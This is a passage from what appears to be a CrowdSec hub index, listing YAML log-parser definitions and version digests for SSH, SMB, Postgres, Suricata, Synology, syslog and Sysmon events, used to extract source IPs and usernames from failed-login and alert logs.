"4473cedee88009d1a660c9695e9a128f3c2692020ea3cb1dd74b85422074ae31"}, "0.3": {"digest": "4ac2695dcfbbd1bfa1402b95a642b2868ab61900714e7a17c2fb5f0235a3777b"}, "0.4": {"digest": "b5c3c870a15370b249b443fb75c68f4efe894c92a86c4eaca39ee3ce993fd972"}}}, "crowdsecurity/smb-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/smb-logs\nfilter: evt.Parsed.program == 'smb'\ndescription: \"Parse SMB logs\"\npattern_syntax:\n  SMB_BAD_PASSWORD: \"Auth:%{GREEDYDATA} user \\\\[%{DATA:smb_domain}\\\\]\\\\\\\\\\\\[%{DATA:user}\\\\]%{GREEDYDATA} status \\\\[NT_STATUS_WRONG_PASSWORD\\\\]%{GREEDYDATA} remote host \\\\[ipv4:%{IP:ip_source}\"\nnodes:\n - grok:\n    name: \"SMB_AUTH_FAIL\"\n    apply_on: message\n    statics:\n      - meta: subtype\n        value: smb_bad_user\n - grok:\n    name: \"SMB_BAD_PASSWORD\"\n    apply_on: message\n    statics:\n      - meta: subtype\n        value: smb_bad_password\nstatics:\n  - meta: log_type\n    value: smb_failed_auth\n  - meta: source_ip\n    expression: \"evt.Parsed.ip_source\"\n  - meta: user\n    expression: \"evt.Parsed.user\"", "description": "Parse SMB logs", "path": "parsers/s01-parse/crowdsecurity/smb-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "a68bdf79455bda0a84ffaa109752b682266ea0e050d04c260a965a0dbac0fb27"}, "0.2": {"digest": "d2b661f9ef78d245d6fb08ad02689b244ffa2edf9d89c7f4b9bfddc9a04d0a7b"}}}, "crowdsecurity/sshd-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program in ['sshd-session', 'sshd']\"\nname: crowdsecurity/sshd-logs\ndescription: \"Parse openSSH logs\"\npattern_syntax:\n  # The IP grok pattern that ships with crowdsec is buggy and does not capture the last digit of an IP if it is the last thing it matches, and the last octet starts with a 2\n  # https://github.com/crowdsecurity/crowdsec/issues/938\n  IPv4_WORKAROUND: (?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\n  IP_WORKAROUND: (?:%{IPV6}|%{IPv4_WORKAROUND})\n  SSHD_AUTH_FAIL: 'pam_%{DATA:pam_type}\\(sshd:auth\\): authentication failure; logname= uid=%{NUMBER:uid}? euid=%{NUMBER:euid}? tty=ssh ruser= rhost=%{IP_WORKAROUND:sshd_client_ip}( %{SPACE}user=%{USERNAME:sshd_invalid_user})?'\n  SSHD_MAGIC_VALUE_FAILED: 'Magic value check failed \\(\\d+\\) on obfuscated handshake from %{IP_WORKAROUND:sshd_client_ip} port \\d+'\n  SSHD_INVALID_USER: 'Invalid user\\s*%{USERNAME:sshd_invalid_user}? from %{IP_WORKAROUND:sshd_client_ip}( port \\d+)?'\n  SSHD_INVALID_USER_ALT: 'Failed keyboard-interactive/pam for invalid user %{USERNAME:sshd_invalid_user} from %{IP_WORKAROUND:sshd_client_ip}( port \\d+)?'\n  SSHD_INVALID_BANNER: 'banner exchange: Connection from %{IP_WORKAROUND:sshd_client_ip} port \\d+: invalid format'\n  SSHD_PREAUTH_AUTHENTICATING_USER: 'Connection (closed|reset) by( (authenticating|invalid) user %{USERNAME:sshd_invalid_user})? %{IP_WORKAROUND:sshd_client_ip} port \\d+ \\[preauth\\]'\n  #following: https://github.com/crowdsecurity/crowdsec/issues/1201 - some scanners behave differently and trigger this one\n  SSHD_PREAUTH_AUTHENTICATING_USER_ALT: 'Disconnected from (authenticating|invalid) user %{USERNAME:sshd_invalid_user} %{IP_WORKAROUND:sshd_client_ip} port \\d+ \\[preauth\\]'\n  SSHD_BAD_KEY_NEGOTIATION: 'Unable to negotiate with %{IP_WORKAROUND:sshd_client_ip} port \\d+: no matching (host key type|key exchange method|MAC) found.'\n  # in case they are blocked by /etc/ssh/sshd_config AllowUsers xx yy\n  SSHD_NOT_ALLOWED_USER: 'User %{USERNAME:sshd_invalid_user}? from %{IP_WORKAROUND:sshd_client_ip}( port \\d+)? not allowed because not listed in AllowUsers'\n  SSHD_AUTH_TIMEOUT: 'Timeout before authentication for %{IP_WORKAROUND:sshd_client_ip}( port \\d+)?'\n  SSHD_DISPATCH_FATAL: 'ssh_dispatch_run_fatal: Connection from %{IP_WORKAROUND:sshd_client_ip}( port \\d+)?: message authentication code incorrect \\[preauth\\]'\n  SSHD_REFUSED_CONN: 'refused connect from.*\\((::ffff:)?%{IP_WORKAROUND:sshd_client_ip}\\)'\nnodes:\n  - grok:\n      name: \"SSHD_FAIL\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_PREAUTH_AUTHENTICATING_USER_ALT\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_PREAUTH_AUTHENTICATING_USER\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_DISC_PREAUTH\"\n      apply_on: message\n  - grok:\n      name: \"SSHD_BAD_VERSION\"\n      apply_on: message\n  - grok:\n      name: \"SSHD_INVALID_USER\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_INVALID_USER_ALT\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_NOT_ALLOWED_USER\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_INVALID_BANNER\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: extra_log_type\n          value: ssh_bad_banner\n  - grok:\n      name: \"SSHD_USER_FAIL\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_AUTH_FAIL\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_MAGIC_VALUE_FAILED\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.sshd_invalid_user\"\n  - grok:\n      name: \"SSHD_BAD_KEY_NEGOTIATION\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_bad_keyexchange\n  - grok:\n      name: \"SSHD_AUTH_TIMEOUT\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_auth_timeout\n  - grok:\n      name: \"SSHD_DISPATCH_FATAL\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_dispatch_fatal\n  - grok:\n      name: \"SSHD_REFUSED_CONN\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ssh_refused_conn\nstatics:\n  - meta: service\n    value: ssh\n  - meta: source_ip\n    expression: \"evt.Parsed.sshd_client_ip\"\n", "description": "Parse openSSH logs", "path": "parsers/s01-parse/crowdsecurity/sshd-logs.yaml", "stage": "s01-parse", "version": "3.1", "versions": {"0.1": {"digest": "ecd40cb8cd95e2bad398824ab67b479362cdbf0e1598b8833e2f537ae3ce2f93"}, "0.2": {"digest": "6251a150d0d0dfe5b3942fd700c4e7b631393a2a4f1d949137ddba0b75d2dc6d"}, "0.3": {"digest": "b57b59915825de330b1c0ecf19961fbc033f7784e4670a09f739d84839e2bc81"}, "0.4": {"digest": "a8a89934a9524f43b9b51d1e62fd67af1834f9c7dfa1c36bc2bfdf9158d5966e"}, "0.5": {"digest": "18525728a1985eeac9107bc0fc2583622bf597dd256230689f3e788e992e0410"}, "0.6": {"digest": "5294aa1660260d1bd11520e80dc6f578208679e36456c10f143b3eb28d209fd4"}, "0.7": {"digest": "ad96d89f89e69fe3b9a0c70b7d643d4965cb893f719722d09957c38e89c31a8d"}, "0.8": {"digest": "de14c443378bf69c5c44533bb5d19f32c8b099c7365ac35c35f4c873c22103a3"}, "0.9": {"digest": "b728744d1244fe26d5445ea1e0460014538ea1cba0c8bd6b6ebcaf46d3b9b765"}, "1.0": {"digest": "5603517aa38c9a1deacc993e34ab4adc4047133e51a804ba7cfa782bd973e821"}, "1.1": {"digest": "bbf71af714985e63a01fa70b0d9485e74dfedf77100750523fabce59e8b6b5eb"}, "1.2": {"digest": "63cca80e6f4a02bde8ecb2877c3361c78410643dd66e1059e4ddf7f400fdf916"}, "1.3": {"digest": "36fa6247f3739ed4127e4fdae8a60c314e892a5106cb1b37181ad4fc1e054751"}, "1.4": {"digest": "2bed97f303d5df2bf1852864d5265281cd1d73db39a2679b9e94bb6e5542e348"}, "1.5": {"digest": "dd39640ed9ac34409d45261d343c88adbd5a4ee3c8f81c1a7dac77a23539e41e"}, "1.6": {"digest": "31dadf77665bee1d89ea9d407bd58ad6911753c8a642794277cffd6adf46bbf7"}, "1.7": {"digest": "162dd1da5beb8e52d093dc6b3a417ac2c80004b5b4576bbed9b590896fca3f15"}, "1.8": {"digest": "95d30ef78866c26d2c6235fcd302eb50a67a84fcea031742aed4a5afd4d2b942"}, "1.9": {"digest": "251f05b5398ce5958e6686c392804112b90ffb2b9d5f717052639471983e20d3"}, "2.0": {"digest": "85cc308adad1051bca9575f4adbda27a0f176bf3d3ffc8893e3657ad2a38bfd2"}, "2.1": {"digest": "5e7744b19993458adcca52ad039e8b0f64073c1c2f8bc6320f445c21daa79007"}, "2.2": {"digest": "509cfb3fecfc6922de0d09eb54c8c63b773678d7ff543ef0e3590ea5a8b3dc2e"}, "2.3": {"digest": "a58765b08b7df52bfd07f3efba65f2b54b984181e0edacabc7cffc20c90de733"}, "2.4": {"digest": "82586e712780e06bd6851b41264d82765f708344ffc4a82d0aac11eab34ce353"}, "2.5": {"digest": "72d2401186e070aeba716301c36c08b0f1c26b60b9cd76f4eb59fadfd04589ee"}, "2.6": {"digest": "30c49a38d17a5ace21f41cbe175164722d1bc89ca374b1520d432d94a208a725"}, "2.7": {"digest": "7d541c12f97b090c5f7259b1d2c57fc6205aeea16fc7103d5bbf317f8023f27d"}, "2.8": {"digest": "8f2ba8205583b13ef3715d679accc17a503500a6cae3fd4ea4d847da22b3abdf"}, "2.9": {"digest": "3848848c6e51df15f79ebd2fed312c5082b33b0b55413fc417773b379ec9ea04"}, "3.0": {"digest": "11ec68b930b91079e4dd6561d70db9a575d6d9c9f539ddddf60ad3783e78726d"}, "3.1": {"digest": "045ff4c7895888becf161a8666ec173c45b58e52f2a72583a03f22b40203390d"}}}, "crowdsecurity/sshd-success-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'sshd'\"\nname: crowdsecurity/sshd-success-logs\ndescription: \"Parse successful ssh logins\"\npattern_syntax:\n  IPv4_WORKAROUND: (?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\n  IP_WORKAROUND: (?:%{IPV6}|%{IPv4_WORKAROUND})\nnodes:\n  - grok:\n      pattern: \"Accepted (publickey|password) for %{USERNAME:sshd_auth_user} from %{IP_WORKAROUND:sshd_client_ip} port %{NUMBER:sshd_client_port} ssh2%{GREEDYDATA:sshd_trail}\"\n      apply_on: message\nstatics:\n    - meta: service\n      value: ssh\n    - meta: source_ip\n      expression: \"evt.Parsed.sshd_client_ip\"\n    - meta: user\n      expression: \"evt.Parsed.sshd_auth_user\"\n    - meta: log_type\n      value: auth_success\n", "description": "Parse successful ssh logins", "path": "parsers/s01-parse/crowdsecurity/sshd-success-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "978219d419633422469bdeb10500a58f05260d34039243d47306db038910f141"}}}, "crowdsecurity/stirling-pdf-logs": {"content": "onsuccess: next_stage\ndebug: false\nfilter: \"evt.Parsed.program == 'stirling-pdf'\"\nname: crowdsecurity/stirling-pdf-logs\ndescription: \"Parse Stirling PDF logs\"\nnodes:\n  - grok:\n      pattern: \"%{TIMESTAMP_ISO8601:timestamp} %{WORD:log_level} .*CustomAuthenticationFailureHandler \\\\[.*\\\\] Failed login attempt from IP: \\\\[?%{IP:source_ip}\\\\]?\"\n      apply_on: message\n    statics:\n      - meta: log_type\n        value: failed_authentication\nstatics:\n  - meta: service\n    value: stirling-pdf\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp", "description": "Parse Stirling PDF logs", "path": "parsers/s01-parse/crowdsecurity/stirling-pdf-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "1e37cb2637e0405936ec544a3958d052c13028d5980a5f404cce1b03d8fcc47f"}}}, "crowdsecurity/supabase-docker-pgsql": {"content": "onsuccess: next_stage\nname: crowdsecurity/supabase-docker-pgsql\ndescription: \"Parse PgSQL logs\"\nfilter: \"evt.Parsed.program == 'postgres'\"\nnodes:\n  - grok:\n    #supabase docker compose postgres password auth fail\n      pattern: '%{IPORHOST:source_ip} %{TIMESTAMP_ISO8601:timestamp} %{WORD:zone} \\[%{INT:PID}\\] %{USERNAME:pgsql_user}@%{GREEDYDATA:pgsql_dbname} FATAL:  %{WORD:auth_method} authentication failed for user \"%{USERNAME:pgsql_target_user}\"'\n      apply_on: message\n\nstatics:\n  - meta: log_type\n    value: pgsql_failed_auth\n  - meta: auth_method\n    expression: \"evt.Parsed.auth_method\"\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: user\n    expression: \"evt.Parsed.pgsql_target_user\"\n  - meta: db\n    expression: \"evt.Parsed.pgsql_dbname\"\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp", "description": "Parse PgSQL logs", "path": "parsers/s01-parse/crowdsecurity/supabase-docker-pgsql.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "52ae47f8f6899c97700f7cc1049cd34077bd6e3ecfcd2c0667f8107ef7432892"}}}, "crowdsecurity/suricata-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'suricata-fastlogs'\"\nname: crowdsecurity/suricata-fastlogs\ndescription: \"Parse suricata fast.log\"\npattern_syntax:\n  SURICATA_MARKER: '\\[\\*\\*\\]'\n  SURICATA_DATE: '%{DATE_US:date}-%{TIME:time}'\n  SURICATA_RULE_ID: '\\[%{NUMBER:suricata_rule_severity}:%{NUMBER:rule_id}:%{NUMBER:suricata_alert_signature_rev}\\]'\ngrok: \n  pattern: '%{SURICATA_DATE}  %{SURICATA_MARKER} %{SURICATA_RULE_ID} %{DATA:suricata_alert_signature} %{SURICATA_MARKER} \\[Classification: %{DATA:suricata_classification}\\] \\[Priority: %{NUMBER:suricata_priority}\\] \\{%{DATA:proto}\\} %{IP:source_ip}:%{NUMBER:source_port} \\-> %{IP:dest_ip}:%{NUMBER:dest_port}'\n  apply_on: message\nstatics:\n  - meta: service\n    value: suricata\n  - meta: log_type\n    value: suricata_alert\n  - meta: sub_log_type\n    value: suricata_alert_fast_log\n      #we build back RFC3339 format\n  - target: evt.Parsed.suricata_timestamp\n    expression: evt.Parsed.date + ' ' + evt.Parsed.time\n  - target: evt.StrTime\n    expression: evt.Parsed.date + ' ' + evt.Parsed.time\n  - meta: suricata_alert_signature_id\n    expression: evt.Parsed.rule_id\n  - meta: suricata_rule_severity\n    expression: evt.Parsed.suricata_rule_severity\n  - meta: source_ip\n    expression: evt.Parsed.source_ip\n---\nonsuccess: next_stage\nfilter: |\n  evt.Parsed.program == \"suricata-evelogs\" && JsonExtract(evt.Parsed.message, \"event_type\") == \"alert\"\nname: crowdsecurity/suricata-evelogs\ndescription: \"Parse suricata eve.json logs\"\npattern_syntax:\n  SURICATA_EVE_TS: '%{TIMESTAMP_ISO8601:time}'\nnodes:\n  - grok:\n      pattern: '%{SURICATA_EVE_TS:time}(\\-|\\+)%{INT}'\n      expression: JsonExtract(evt.Parsed.message, \"timestamp\")\nstatics:\n  - meta: service\n    value: suricata\n  - meta: log_type\n    value: suricata_alert\n  - meta: sub_log_type\n    value: suricata_alert_eve_json\n  - target: evt.StrTime\n    expression: evt.Parsed.time + 'Z'\n  - target: evt.Meta.suricata_flow_id\n    expression: JsonExtract(evt.Parsed.message, \"flow_id\")\n  - target: evt.Meta.source_ip\n    expression: JsonExtract(evt.Parsed.message, \"src_ip\")\n  - target: evt.Parsed.dest_ip\n    expression: JsonExtract(evt.Parsed.message, \"dest_ip\")\n  - target: evt.Parsed.dest_port\n    expression: JsonExtract(evt.Parsed.message, \"dest_port\")\n  - target: evt.Parsed.proto\n    expression: JsonExtract(evt.Parsed.message, \"proto\")\n  - target: evt.Meta.suricata_alert_signature_id\n    expression: JsonExtract(evt.Parsed.message, \"alert.signature_id\")\n  - target: evt.Parsed.suricata_alert_signature_rev\n    expression: JsonExtract(evt.Parsed.message, \"alert.rev\")\n  - target: evt.Parsed.suricata_alert_signature\n    expression: JsonExtract(evt.Parsed.message, \"alert.signature\")\n  - target: evt.Meta.suricata_rule_severity\n    expression: JsonExtract(evt.Parsed.message, \"alert.severity\")\n\n\n", "description": "Parse suricata fast.log", "path": "parsers/s01-parse/crowdsecurity/suricata-logs.yaml", "stage": "s01-parse", "version": "0.6", "versions": {"0.1": {"digest": "8d2c360a278360d24fd5882646c89cea866ba21db80f1b02732b53f57469ee73"}, "0.2": {"digest": "6b768c66d6d2fb86d7707bac122e819300fbf8a635f466af8f9eda373741b38d"}, "0.3": {"digest": "8ef8604a888c2242252759267ea353f3b0f00a5bf927ad0d740a177fd6e3b4ce"}, "0.4": {"digest": "245dc731e0b563f998c2b5815a70330a3648158c0dfd8f2de26d945518cfee44"}, "0.5": {"digest": "c52782b7b3b37eec48359f37420555be73334dc5fc535cbf55b96e8a7d175506"}, "0.6": {"digest": "b3a55203e30b26f2cc1765278545389d79551838bc28643cf21a3150fc2efed6"}}}, "crowdsecurity/synology-dsm-logs": {"content": "# Synology DSM auth.log\n#debug: true\nfilter: \"evt.Parsed.program matches 'synoscgi_SYNO.API.Auth_[1-9]([0-9])?_login'\"\nname: crowdsecurity/synology-dsm-logs\ndescription: \"Parse Synology DSM web auth logs\"\nonsuccess: next_stage\nformat: 2.0\npattern_syntax:\n  TIMESTAMP: '%{YEAR}-%{MONTHNUM}-%{MONTHDAY}T%{HOUR}:%{MINUTE}:%{SECOND}+%{ISO8601_TIMEZONE}'\n# The IP grok pattern that ships with crowdsec is buggy and does not capture the last digit of an IP if it is the last thing it matches, and the last octet starts with a 2\n# https://github.com/crowdsecurity/crowdsec/issues/938\n  IPv4_WORKAROUND: '(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'\n  IP_WORKAROUND: '(?:%{IPV6}|%{IPv4_WORKAROUND})'\n  AUTH_LOG_FAIL: 'pam_unix\\(webui:auth\\): authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=%{IP_WORKAROUND:src_ip}'\ngrok:\n  pattern: \"%{AUTH_LOG_FAIL}\"\n  apply_on: message\n  statics:\n    - meta: log_type\n      value: synology-dsm_failed_auth\nstatics:\n  - meta: log_type\n    value: synology-dsm_failed_auth\n  - meta: service\n    value: synology-dsm\n  - meta: source_ip\n    expression: \"evt.Parsed.src_ip\"\n", "description": "Parse Synology DSM web auth logs", "path": "parsers/s01-parse/crowdsecurity/synology-dsm-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "d3ef07ad8fc314f8617c2e4dc852da0c887e6c9a9cd68dc8bafbd5e66673400b"}, "0.2": {"digest": "8815fe3b21d0001fb2d42843e1d239e7cc6a763153162236c3c4155aef26a190"}, "0.3": {"digest": "a50a8b51fe5e43d62e7ccdf88306790e94f824b5474a78ad2c5ce4ae8c1b0d1d"}}}, "crowdsecurity/syslog-logs": {"content": "#If it's syslog, we are going to extract progname from it\nfilter: \"evt.Line.Labels.type == 'syslog'\"\nonsuccess: next_stage\npattern_syntax:\n  RAW_SYSLOG_PREFIX: '^<%{NUMBER:stuff1}>%{NUMBER:stuff2} %{SYSLOGBASE2} %{DATA:program} %{NUMBER:pid}'\n  RAW_SYSLOG_META: '\\[meta sequenceId=\"%{NOTDQUOTE:seq_id}\"\\]'\nname: crowdsecurity/syslog-logs\nnodes:\n  - grok:\n      #this is a named regular expression. grok patterns can be kept into separate files for readability\n      pattern: \"^%{SYSLOGLINE}\" \n      #This is the field of the `Event` to which the regexp should be applied\n      apply_on: Line.Raw\n  - grok:\n      #a second pattern for unparsed syslog lines, as saw in opnsense\n      pattern: '%{RAW_SYSLOG_PREFIX} - %{RAW_SYSLOG_META} %{GREEDYDATA:message}'\n      apply_on: Line.Raw\n#if the node was successfull, statics will be applied.\nstatics:\n  - meta: machine\n    expression: evt.Parsed.logsource\n  - parsed: \"logsource\"\n    value: \"syslog\"\n# syslog date can be in two different fields (one of hte assignment will fail)\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp8601\n  - meta: datasource_path\n    expression: evt.Line.Src\n  - meta: datasource_type\n    expression: evt.Line.Module\n---\n#if it's not syslog, the type is the progname\nfilter: \"evt.Line.Labels.type not in ['syslog', 'unifi']\"\nonsuccess: next_stage\nname: crowdsecurity/non-syslog\n#debug: true\nstatics:\n  - parsed: message\n    expression: evt.Line.Raw\n  - parsed: program\n    expression: evt.Line.Labels.type\n  - meta: datasource_path\n    expression: evt.Line.Src\n  - meta: datasource_type\n    expression: evt.Line.Module\n\n", "path": "parsers/s00-raw/crowdsecurity/syslog-logs.yaml", "stage": "s00-raw", "version": "0.9", "versions": {"0.1": {"digest": "44e8cfbf528dcd70c6cc329df1b963f6861668796c706cc79050b0907a85540e"}, "0.2": {"digest": "a80dffe6371664eea6ad42af1d386a9447e25a5917f1f489959fcb34ce37f363"}, "0.3": {"digest": "3a284fc04e777a9e8d7606f2fcc09e092ec2ae45103d249d30ebb6eda8fea65a"}, "0.4": {"digest": "74898d3d78b329435253d376376290d57422919618b411e7b1c3c249ac6efecd"}, "0.5": {"digest": "08fa391d35558900669e1b0d0f6b8373d32053d8138355785b6b07e830675ff7"}, "0.6": {"digest": "9f4da801bd0c193d4e24b56c465e081a7df8c17cd8b4340b1d4950c8220196f2"}, "0.7": {"digest": "8d15b6ab76aea4f785a05f31ba84a92e96c1cd3a2644e7a63d98feebd16e1995"}, "0.8": {"digest": "d637382a9f927a4d8101cfc8d42b39cd83d1327e074cc5c48c0a8827fedec6d5"}, "0.9": {"digest": "0156f2ff2942a4543534721ede6f3b4154a3c01573acab1506ac6403e4cb2623"}}}, "crowdsecurity/sysmon-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.Channel == 'Microsoft-Windows-Sysmon/Operational'\"\nname: crowdsecurity/sysmon\ndescription: \"Parse sysmon events\"\nnodes:\n  - filter: evt.Parsed.EventID == '1'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: FileVersion\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='FileVersion']\")\n      - parsed: Description\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Description']\")\n      - parsed: Company\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Company']\")\n      - parsed: OriginalFileName\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='OriginalFileName']\")\n      - parsed: CommandLine\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='CommandLine']\")\n      - parsed: CurrentDirectory\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='CurrentDirectory']\")\n      - parsed: User\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='User']\")\n      - parsed: LogonGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='LogonGuid']\")\n      - parsed: LogonId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='LogonId']\")\n      - parsed: TerminalSessionId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TerminalSessionId']\")\n      - parsed: IntegrityLevel\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='IntegrityLevel']\")\n      - parsed: Hashes\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Hashes']\")\n      - parsed: ParentProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ParentProcessGuid']\")\n      - parsed: ParentProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ParentProcessId']\")\n      - parsed: ParentImage\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ParentImage']\")\n      - parsed: ParentCommandLine\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ParentCommandLine']\")\n      - parsed: ParentUser\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ParentUser']\")\n      - meta: SysmonEventType\n        value: ProcessCreation\n      - meta: CommandLine\n        expression: evt.Parsed.CommandLine\n      - meta: CurrentDirectory\n        expression: evt.Parsed.CurrentDirectory\n      - meta: User\n        expression: evt.Parsed.User\n      - meta: Hashes\n        expression: evt.Parsed.Hashes\n      - meta: ParentImage\n        expression: evt.Parsed.ParentImage\n  - filter: evt.Parsed.EventID == '2'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: TargetFilename\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetFilename']\")\n      - parsed: CreationUtcTime\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='CreationUtcTime']\")\n      - parsed: CreationUtcTime\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='CreationUtcTime']\")\n      - meta: SysmonEventType\n        value: CreationTimeChanged\n  - filter: evt.Parsed.EventID == '3'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: User\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='User']\")\n      - parsed: Protocol\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Protocol']\")\n      - parsed: Initiated\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Initiated']\")\n      - parsed: SourceIsIpv6\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceIsIpv6']\")\n      - parsed: SourceIp\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceIp']\")\n      - parsed: SourceHostname\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceHostname']\")\n      - parsed: SourcePort\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourcePort']\")\n      - parsed: SourcePortName\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourcePortName']\")\n      - parsed: DestinationIsIpv6\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='DestinationIsIpv6']\")\n      - parsed: DestinationIp\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='DestinationIp']\")\n      - parsed: DestinationHostname\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='DestinationHostname']\")\n      - parsed: DestinationPort\n        expression: 